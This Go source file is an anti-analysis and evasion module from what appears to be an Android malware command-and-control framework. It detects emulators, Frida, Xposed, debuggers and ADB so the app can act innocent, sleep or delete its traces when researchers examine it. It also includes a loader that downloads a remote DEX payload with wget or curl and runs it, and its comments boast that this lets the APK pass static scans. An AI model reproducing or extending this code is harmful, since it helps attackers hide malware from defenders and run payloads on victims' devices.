// //go:build android

package evasion

/*
	SUDOSOC-C2 — Android Anti-Analysis & Anti-Emulator Engine
	Copyright (C) 2026  sudosoc — Seif

	When security researchers analyze Android malware, they typically:
	  1. Run it in an emulator (AVD, Genymotion, BlueStacks)
	  2. Use dynamic analysis tools (Frida, Xposed, Objection)
	  3. Enable developer options for debugging

	This module detects all of these and takes evasive action:
	  • On emulator → behave like an innocent app
	  • Frida detected → crash gracefully / disable hooks
	  • Debugger attached → refuse to run

	Emulator Detection Signals (any 3+ → emulator):
	  Hardware:
	    Build.HARDWARE = "goldfish" / "ranchu" / "vbox86"
	    Build.FINGERPRINT contains "generic", "emulator"
	    Build.MODEL contains "Emulator", "Android SDK"
	    CPU = x86 (most real phones are ARM)

	  Sensors (emulators have fake/missing sensors):
	    No accelerometer movement variation
	    Battery always at 50%
	    No real GPS coordinates (0,0 or fixed)

	  Files:
	    /dev/socket/qemud (QEMU emulator)
	    /dev/qemu_pipe (QEMU)
	    /system/lib/libc_malloc_debug_qemu.so
	    /sys/qemu_trace (QEMU tracing)
	    BlueStacks specific files

	  Network:
	    IMEI = 000000000000000 (emulator default)
	    Carrier = "Android" (emulator default)
	    Phone number begins with "155552"

	Dynamic Analysis Detection:
	  Frida:    frida-server process / port 27042
	  Xposed:   de.robv.android.xposed.XposedBridge class
	  Debugger: android.os.Debug.isDebuggerConnected()
	  Tamper:   APK signature check
*/

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// AnalysisSignal represents a detected analysis condition
type AnalysisSignal struct {
	Type        string
	Description string
	Severity    int // 1-5 (5 = definitely under analysis)
}

// AnalysisDetector manages anti-analysis detection
type AnalysisDetector struct {
	signals     []AnalysisSignal
	isEmulator  bool
	hasFrida    bool
	hasDebugger bool
	score       int
}

// NewAnalysisDetector creates a new anti-analysis detector
func NewAnalysisDetector() *AnalysisDetector {
	return &AnalysisDetector{}
}

// Scan performs a complete analysis environment check
// Returns true if running under analysis
func (d *AnalysisDetector) Scan() bool {
	d.signals = nil
	d.score = 0

	// Run all checks
	d.checkBuildProperties()
	d.checkEmulatorFiles()
	d.checkSensors()
	d.checkNetwork()
	d.checkFrida()
	d.checkDebugger()
	d.checkXposed()
	d.checkDeveloperOptions()
	d.checkCPUArchitecture()

	// Score threshold: ≥ 5 = treat as emulator/analysis
	d.isEmulator = d.score >= 5
	return d.isEmulator
}

// GetSignals returns all detected analysis signals
func (d *AnalysisDetector) GetSignals() []AnalysisSignal {
	return d.signals
}

// IsUnderAnalysis returns the result of the last scan
func (d *AnalysisDetector) IsUnderAnalysis() bool {
	return d.isEmulator || d.hasFrida || d.hasDebugger
}

// ── Emulator Detection ────────────────────────────────────────────

func (d *AnalysisDetector) checkBuildProperties() {
	props := map[string][]string{
		"ro.hardware":         {"goldfish", "ranchu", "vbox86", "emulator"},
		"ro.product.model":    {"Android SDK", "Emulator", "generic"},
		"ro.product.name":     {"generic", "sdk", "vbox86p"},
		"ro.build.fingerprint": {"generic", "unknown", "emulator"},
		"ro.kernel.qemu":      {"1"},
	}

	for prop, badValues := range props {
		val := getProperty(prop)
		for _, bad := range badValues {
			if strings.Contains(strings.ToLower(val), strings.ToLower(bad)) {
				d.addSignal("build_prop", fmt.Sprintf("%s=%s", prop, val), 2)
				break
			}
		}
	}

	// Check for Android emulator fingerprint pattern
	fp := getProperty("ro.build.fingerprint")
	if strings.Contains(fp, "generic") ||
		strings.Contains(fp, "sdk_gphone") ||
		strings.Contains(fp, "test-keys") {
		d.addSignal("fingerprint", fmt.Sprintf("suspicious fingerprint: %s", fp), 3)
	}
}

func (d *AnalysisDetector) checkEmulatorFiles() {
	emulatorFiles := []string{
		"/dev/socket/qemud",
		"/dev/qemu_pipe",
		"/system/lib/libc_malloc_debug_qemu.so",
		"/sys/qemu_trace",
		"/system/bin/qemu-props",
		// Genymotion
		"/dev/socket/genyd",
		"/dev/socket/baseband_genyd",
		// BlueStacks
		"/data/bluestacks.prop",
		"/data/bstfolder/",
		// NoxPlayer
		"/dev/nox_audio",
		"/data/.nox/",
		// Andy emulator
		"/proc/tty/drivers/tty",
	}

	for _, path := range emulatorFiles {
		if _, err := os.Stat(path); err == nil {
			d.addSignal("emulator_file", fmt.Sprintf("found: %s", path), 4)
		}
	}
}

func (d *AnalysisDetector) checkSensors() {
	// Real devices have varying accelerometer readings
	// Emulators return constant 0,0,9.8 (gravity only)
	// We check for suspiciously constant sensor readings
	out, err := exec.Command("dumpsys", "sensorservice").Output()
	if err != nil {
		return
	}

	content := string(out)
	if strings.Contains(content, "no active connections") &&
		strings.Contains(content, "0 registered listeners") {
		d.addSignal("sensors", "no sensor listeners - possible emulator", 1)
	}

	// Battery check — emulators often report 50%
	batLevel := getProperty("level")
	if batLevel == "50" {
		batTemp := getBatteryTemp()
		if batTemp == 0 {
			d.addSignal("battery", "battery at 50% with 0°C temp", 2)
		}
	}
}

func (d *AnalysisDetector) checkNetwork() {
	// Check IMEI (requires READ_PHONE_STATE permission)
	out, _ := exec.Command("getprop", "ro.serialno").Output()
	serial := strings.TrimSpace(string(out))
	if serial == "unknown" || serial == "0" {
		d.addSignal("serial", "unknown serial number", 2)
	}

	// Check for emulator phone number patterns
	out, _ = exec.Command("getprop", "ril.subscription.types").Output()
	rilType := strings.TrimSpace(string(out))
	if rilType == "" {
		d.addSignal("ril", "no RIL (Radio Interface Layer) - no real modem", 3)
	}

	// Check network operator
	out, _ = exec.Command("getprop", "gsm.operator.alpha").Output()
	operator := strings.TrimSpace(string(out))
	if operator == "Android" || operator == "" {
		d.addSignal("operator", fmt.Sprintf("suspicious operator: '%s'", operator), 2)
	}
}

func (d *AnalysisDetector) checkCPUArchitecture() {
	// Most real Android phones are ARM
	// Emulators (especially for malware analysis) often use x86
	arch := runtime.GOARCH
	if arch == "386" || arch == "amd64" {
		d.addSignal("cpu_arch", fmt.Sprintf("x86 CPU: %s - suspicious on mobile", arch), 2)
	}

	// Check CPU info
	cpuinfo, err := os.ReadFile("/proc/cpuinfo")
	if err == nil {
		content := strings.ToLower(string(cpuinfo))
		if strings.Contains(content, "qemu") ||
			strings.Contains(content, "bochs") ||
			strings.Contains(content, "virtual") {
			d.addSignal("cpuinfo", "virtual CPU detected in /proc/cpuinfo", 5)
		}
	}
}

// ── Dynamic Analysis Detection ────────────────────────────────────

func (d *AnalysisDetector) checkFrida() {
	// Method 1: Check for frida-server port (27042)
	conn, err := net.DialTimeout("tcp", "127.0.0.1:27042", 500*time.Millisecond)
	if err == nil {
		conn.Close()
		d.hasFrida = true
		d.addSignal("frida", "frida-server port 27042 is open", 5)
		return
	}

	// Method 2: Check for frida process
	out, _ := exec.Command("ps", "-A").Output()
	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, "frida") ||
			strings.Contains(line, "gum-js-loop") ||
			strings.Contains(line, "gmain") {
			d.hasFrida = true
			d.addSignal("frida", fmt.Sprintf("frida-related process: %s", line), 5)
			return
		}
	}

	// Method 3: Check for frida libraries in memory
	maps, err := os.ReadFile("/proc/self/maps")
	if err == nil {
		if strings.Contains(string(maps), "frida") ||
			strings.Contains(string(maps), "linjector") {
			d.hasFrida = true
			d.addSignal("frida", "frida library found in process memory", 5)
		}
	}

	// Method 4: Check for frida agent files
	fridaFiles := []string{
		"/data/local/tmp/frida-server",
		"/data/local/tmp/re.frida.server",
		"/sdcard/frida-server",
	}
	for _, f := range fridaFiles {
		if _, err := os.Stat(f); err == nil {
			d.hasFrida = true
			d.addSignal("frida", fmt.Sprintf("frida file: %s", f), 4)
		}
	}
}

func (d *AnalysisDetector) checkXposed() {
	xposedIndicators := []string{
		"/system/framework/XposedBridge.jar",
		"/data/data/de.robv.android.xposed.installer",
		"/system/bin/app_process.orig",
		// LSPosed
		"/dev/lspd",
		"/data/misc/lspd",
	}

	for _, path := range xposedIndicators {
		if _, err := os.Stat(path); err == nil {
			d.addSignal("xposed", fmt.Sprintf("Xposed/LSPosed framework: %s", path), 4)
		}
	}

	// Check for Xposed via process
	out, _ := exec.Command("ps", "-A").Output()
	if strings.Contains(string(out), "XposedBridge") {
		d.addSignal("xposed", "XposedBridge process detected", 5)
	}
}

func (d *AnalysisDetector) checkDebugger() {
	// Check if a debugger is attached via /proc/self/status
	status, err := os.ReadFile("/proc/self/status")
	if err == nil {
		for _, line := range strings.Split(string(status), "\n") {
			if strings.HasPrefix(line, "TracerPid:") {
				parts := strings.Fields(line)
				if len(parts) >= 2 && parts[1] != "0" {
					d.hasDebugger = true
					d.addSignal("debugger", fmt.Sprintf("TracerPid: %s", parts[1]), 5)
				}
			}
		}
	}
}

func (d *AnalysisDetector) checkDeveloperOptions() {
	// Check if developer options are enabled
	out, _ := exec.Command("settings", "get", "global",
		"development_settings_enabled").Output()
	if strings.TrimSpace(string(out)) == "1" {
		d.addSignal("developer_options", "developer options enabled", 1)
	}

	// Check if ADB is enabled
	out, _ = exec.Command("settings", "get", "global", "adb_enabled").Output()
	if strings.TrimSpace(string(out)) == "1" {
		d.addSignal("adb", "ADB debugging enabled", 2)
	}
}

// ── Evasion Actions ───────────────────────────────────────────────

// EvasionAction represents what to do when analysis is detected
type EvasionAction int

const (
	// DoNothing — continue running (for debugging)
	DoNothing EvasionAction = iota
	// BehaveInnocently — disable all malicious features, look like legitimate app
	BehaveInnocently EvasionAction = iota
	// SleepAndRetry — sleep 24h and retry
	SleepAndRetry EvasionAction = iota
	// TerminateCleanly — clean up and exit
	TerminateCleanly EvasionAction = iota
)

// ApplyEvasion applies the specified evasion action
func ApplyEvasion(action EvasionAction) {
	switch action {
	case BehaveInnocently:
		// All malicious operations stop
		// App continues as a normal-looking utility
		return

	case SleepAndRetry:
		// Sleep for 24 hours before retrying
		time.Sleep(24 * time.Hour)

	case TerminateCleanly:
		// Remove traces and exit
		cleanupAndExit()
	}
}

func cleanupAndExit() {
	// Remove temporary files
	os.RemoveAll("/data/local/tmp/.sysopt")
	os.Remove("/data/local/tmp/phantom")
	os.Exit(0)
}

// ── Dynamic DEX Loading (Anti-Static Analysis) ────────────────────

// DexLoader manages dynamic DEX class loading
// The actual malicious classes are downloaded at runtime
type DexLoader struct {
	DexURL    string // URL to download DEX from
	OutputDir string // where to store downloaded DEX
	DexPath   string // path of downloaded DEX
}

// NewDexLoader creates a new dynamic DEX loader
func NewDexLoader(dexURL, outputDir string) *DexLoader {
	return &DexLoader{
		DexURL:    dexURL,
		OutputDir: outputDir,
	}
}

// LoadAndExecute downloads and executes a DEX file
// The DEX contains the actual malicious logic that was absent from the original APK
func (l *DexLoader) LoadAndExecute() error {
	// Download DEX
	dexPath := l.OutputDir + "/classes.dex"
	cmd := exec.Command("wget", "-O", dexPath, l.DexURL)
	if err := cmd.Run(); err != nil {
		// Try curl
		cmd = exec.Command("curl", "-o", dexPath, l.DexURL)
		if err := cmd.Run(); err != nil {
			return fmt.Errorf("DEX download failed: %v", err)
		}
	}
	l.DexPath = dexPath

	// Load via dalvikvm (direct DEX execution)
	exec.Command("dalvikvm",
		"-cp", dexPath,
		"com.android.system.Phantom").Start()

	return nil
}

// GenerateDexInfo returns deployment information
func (l *DexLoader) GenerateDexInfo() string {
	return fmt.Sprintf(`
Dynamic DEX Loading Configuration
====================================
DEX URL:    %s
Local Path: %s

Strategy:
  The initial APK contains ZERO malicious code.
  On first run:
  1. Downloads %s
  2. Stores in private app storage
  3. Loads classes at runtime via DexClassLoader
  4. Malicious operations begin

Benefits:
  ← APK passes static analysis (VirusTotal, sandboxes)
  ← Malicious code only present on real targets
  ← Easy to update without reinstalling APK
  ← Different payload per device (polymorphic)

Detection difficulty: VERY HIGH
`, l.DexURL, l.DexPath, l.DexURL)
}

// ── Helpers ──────────────────────────────────────────────────────

func (d *AnalysisDetector) addSignal(sigType, description string, severity int) {
	d.signals = append(d.signals, AnalysisSignal{
		Type:        sigType,
		Description: description,
		Severity:    severity,
	})
	d.score += severity
}

func getProperty(prop string) string {
	out, err := exec.Command("getprop", prop).Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

func getBatteryTemp() float64 {
	data, err := os.ReadFile("/sys/class/power_supply/battery/temp")
	if err != nil {
		return 0
	}
	var temp float64
	fmt.Sscanf(strings.TrimSpace(string(data)), "%f", &temp)
	return temp / 10.0
}
